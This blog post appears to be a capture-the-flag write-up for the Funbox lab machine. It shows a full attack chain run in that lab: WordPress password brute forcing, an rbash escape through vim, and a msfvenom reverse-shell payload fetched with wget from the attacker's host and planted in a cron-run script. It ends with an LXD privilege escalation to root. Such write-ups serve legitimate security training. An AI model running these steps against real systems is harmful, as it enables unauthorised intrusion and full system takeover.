---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/funbox-1,518/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We start with a simple port scan to detect tha attack surface of the target.

## port scan
```bash
$ nmap -Pn -p21,22,80 -sV 192.168.203.77
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 09:37 CEST
Nmap scan report for 192.168.203.77
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
```

## web server
Accessing the web service via the IP shows that we need to add an entry to our `/etc/hosts` file.
```http
GET / HTTP/1.1
Host: 192.168.203.77
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

HTTP/1.1 301 Moved Permanently
Date: Tue, 22 Aug 2023 07:38:05 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Redirect-By: WordPress
Location: http://funbox.fritz.box/
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

> We also learn that there seems to be a `wordpress` installation.
{: .prompt-info }

---
# exploitation

After we added `funbox.fritz.box` to our `/etc/hosts` we continue by doing a `wpscan`.
```bash
$ wpscan --url http://funbox.fritz.box/ --wp-content-dir wp-admin --passwords /usr/share/seclists/Passwords/xato-net-10-million-passwords-10.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://funbox.fritz.box/ [192.168.203.77]
[+] Started: Tue Aug 22 09:43:04 2023

Interesting Finding(s):
...
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - joe / 12345                                                                                                                                                                                                                     
Trying joe / 111111 Time: 00:00:02 <==============================================================================================================                                                         > (18 / 27) 66.66%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: joe, Password: 12345
...
```

> We found valid credentials: `joe:12345`
{: .prompt-info }
  
> Logging in with the credentials in `wordpress` unfortunately does not help, as we are a restricted user who is not allowed to change theme code or upload plugins.
{: .prompt-danger }

Check if the credentials also work for the identified `ftp` service.
```bash
$ ftp 192.168.203.77 
Connected to 192.168.203.77.
220 ProFTPD Server (Debian) [192.168.203.77]
Name (192.168.203.77:void): joe
331 Password required for joe
Password: 
230 User joe logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

> Yes, they do!
{: .prompt-info }

Lets dig through the content.
```bash
ftp> ls
229 Entering Extended Passive Mode (|||15821|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root           33 Aug 22 07:35 local.txt
-rw-------   1 joe      joe           998 Jul 18  2020 mbox
226 Transfer complete
ftp> get local.txt
local: local.txt remote: local.txt
229 Entering Extended Passive Mode (|||34223|)
150 Opening BINARY mode data connection for local.txt (33 bytes)
    33      246.00 KiB/s 
226 Transfer complete
33 bytes received in 00:00 (0.34 KiB/s)
ftp> get mbox
local: mbox remote: mbox
229 Entering Extended Passive Mode (|||49674|)
150 Opening BINARY mode data connection for mbox (998 bytes)
   998        1.15 MiB/s 
226 Transfer complete
998 bytes received in 00:00 (5.79 KiB/s)
```

```bash
$ cat local.txt 
f******************************b
```

> We got the first flag :)
{: .prompt-info }

```bash
$ cat mbox     
From root@funbox  Fri Jun 19 13:12:38 2020
Return-Path: <root@funbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
        id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
Subject: Backups
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131238.2D257446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
From: root <root@funbox>

Hi Joe, please tell funny the backupscript is done.

From root@funbox  Fri Jun 19 13:15:21 2020
Return-Path: <root@funbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
        id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
Subject: Backups
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131521.8E2D4446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
From: root <root@funbox>

Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.
```

Wait a moment... the credentials should also work for `ssh`.
```bash
$ ssh joe@192.168.203.77
joe@192.168.203.77's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 22 Aug 2023 07:55:56 AM UTC

  System load:  0.0               Processes:               161
  Usage of /:   57.0% of 9.78GB   Users logged in:         0
  Memory usage: 64%               IPv4 address for ens160: 192.168.203.77
  Swap usage:   0%


32 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 22 07:54:47 2023 from 192.168.45.248
joe@funbox:~$ id
uid=1001(joe) gid=1001(joe) groups=1001(joe)
```

> And they do! We got a shell.
{: .prompt-info }

---
# post exploitation
## `rbash` escape
Trying to change the directory shows that we are in a restricted bash.
```bash
joe@funbox:~$ cd ..
-rbash: cd: restricted
```

Escape the restriction.  
We are able to execute `vim`. This is is an easy one.
```bash
joe@funbox:~$ vim
:!sh
$ id
uid=1001(joe) gid=1001(joe) groups=1001(joe)
$ cd ..
$ pwd
/home
```

> We escaped.
{: .prompt-info }

## privilege escalation
After we escaped the `rbash` we can have a look what other users exist on the system
```bash
joe@funbox:/home$ ls
funny  joe
```

There is a user named `funny`.
```bash
joe@funbox:/home/funny$ ls -lsah
total 47M
4.0K drwxr-xr-x 3 funny funny 4.0K Aug 21  2020 .
4.0K drwxr-xr-x 4 root  root  4.0K Jun 19  2020 ..
4.0K -rwxrwxrwx 1 funny funny   64 Aug 22 08:10 .backup.sh
   0 lrwxrwxrwx 1 funny funny    9 Aug 21  2020 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 funny funny  220 Feb 25  2020 .bash_logout
4.0K -rw-r--r-- 1 funny funny 3.7K Feb 25  2020 .bashrc
4.0K drwx------ 2 funny funny 4.0K Jun 19  2020 .cache
 47M -rw-rw-r-- 1 funny funny  47M Aug 22 08:10 html.tar
4.0K -rw-r--r-- 1 funny funny  807 Feb 25  2020 .profile
4.0K -rw-rw-r-- 1 funny funny  162 Jun 19  2020 .reminder.sh
```

> There is a file named `.backup.sh` which indicates that this file is executed regularly (probably by a cronjob). And we are able to change the content of the file as we have write permissions.
{: .prompt-info }

So we have the chance to become user `funny`.  
Therefore we generate a simple reverse shell using `msfvenom`.
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.248 LPORT=80 -f elf > abc                                              
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Then we upload the binary to our target.  
Start web server on attacker machine.
```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Upload to target by using `wget` on the target.
```bash
joe@funbox:/tmp$ wget http://192.168.45.248/abc
--2023-08-22 08:09:58--  http://192.168.45.248/abc
Connecting to 192.168.45.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: ‘abc’

abc                                                        100%[========================================================================================================================================>]     194  --.-KB/s    in 0.001s  

2023-08-22 08:09:58 (282 KB/s) - ‘abc’ saved [194/194]

joe@funbox:/tmp$ chmod +x abc
```

We start the reverse shell listener on our attacker machine.
```bash
$ nc -lvp 80    
listening on [any] 80 ...
```

Now we change the content of `.backup.sh` by using an editor on the target like `nano`.  
The content then should look like this.
```bash
joe@funbox:/tmp$ cat /home/funny/.backup.sh 
#!/bin/bash
/tmp/abc
tar -cf /home/funny/html.tar /var/www/html
```

After a minute we get a connection.
```bash
$ nc -lvp 80    
listening on [any] 80 ...
connect to [192.168.45.248] from funbox.fritz.box [192.168.203.77] 33228
id
uid=1000(funny) gid=1000(funny) groups=1000(funny),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

> It worked!
{: .prompt-info }

Upgrading to a full `tty` shell.
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
funny@funbox:/home/funny$ export TERM=xterm
export TERM=xterm
funny@funbox:/home/funny$
```

Having a closer look at the users groups shows that we are in the `lxd` group.  
After a quick research we see that we can exploit this to get `root`.  
(`https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation`)

On the attacker machine.
```bash
$ sudo apt update
$ sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
$ git clone https://github.com/lxc/distrobuilder
$ cd distrobuilder
$ make
$ mkdir -p $HOME/ContainerImages/alpine/
$ cd $HOME/ContainerImages/alpine/
$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
$ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```

Upload the created files `lxd.tar.xz` and `rootfs.squashfs` to the target using a simple web server like we uploaded the other stuff before. 
  
On the target machine.
```bash
funny@funbox:/tmp$ wget http://192.168.45.248/lxd.tar.xz
wget http://192.168.45.248/lxd.tar.xz
--2023-08-22 08:39:38--  http://192.168.45.248/lxd.tar.xz
Connecting to 192.168.45.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 872 [application/x-xz]
Saving to: 'lxd.tar.xz'

lxd.tar.xz          100%[===================>]     872  --.-KB/s    in 0.001s  

2023-08-22 08:39:38 (1.44 MB/s) - 'lxd.tar.xz' saved [872/872]

funny@funbox:/tmp$ wget http://192.168.45.248/rootfs.squashfs
wget http://192.168.45.248/rootfs.squashfs
--2023-08-22 08:39:57--  http://192.168.45.248/rootfs.squashfs
Connecting to 192.168.45.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2883584 (2.8M) [application/octet-stream]
Saving to: 'rootfs.squashfs'

rootfs.squashfs     100%[===================>]   2.75M   580KB/s    in 6.5s    

2023-08-22 08:40:09 (433 KB/s) - 'rootfs.squashfs' saved [2883584/2883584]
```

Executing `lxc` on the target shows that there is a path missing in the environment. Lets fix that.
```bash
funny@funbox:/tmp$ lxc
lxc
Command 'lxc' is available in '/snap/bin/lxc'
The command could not be located because '/snap/bin' is not included in the PATH environment variable.
lxc: command not found
funny@funbox:/tmp$ export PATH=$PATH:/snap/bin
export PATH=$PATH:/snap/bin
funny@funbox:/tmp$ lxc
lxc
Description:
  Command line client for LXD

  All of LXD's features can be driven through the various commands below.
  For help with any of those, simply call them with --help.

Usage:
  lxc [command]
...
```

Now lets continue with the escalation.
```bash
funny@funbox:/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
funny@funbox:/tmp$ lxc init alpine privesc -c security.privileged=true
funny@funbox:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
funny@funbox:/tmp$ lxc start privesc
funny@funbox:/tmp$ lxc exec privesc /bin/sh
# id
uid=0(root) gid=0(root)
```

> `root`!
{: .prompt-info }

## get second flag
Now lets read the `root` flag.
```bash
# cd /mnt/root/root
/mnt/root/root # ls proof.txt
proof.txt

/mnt/root/root # cat proof.txt
1******************************f
```

Pwned! <@:-)
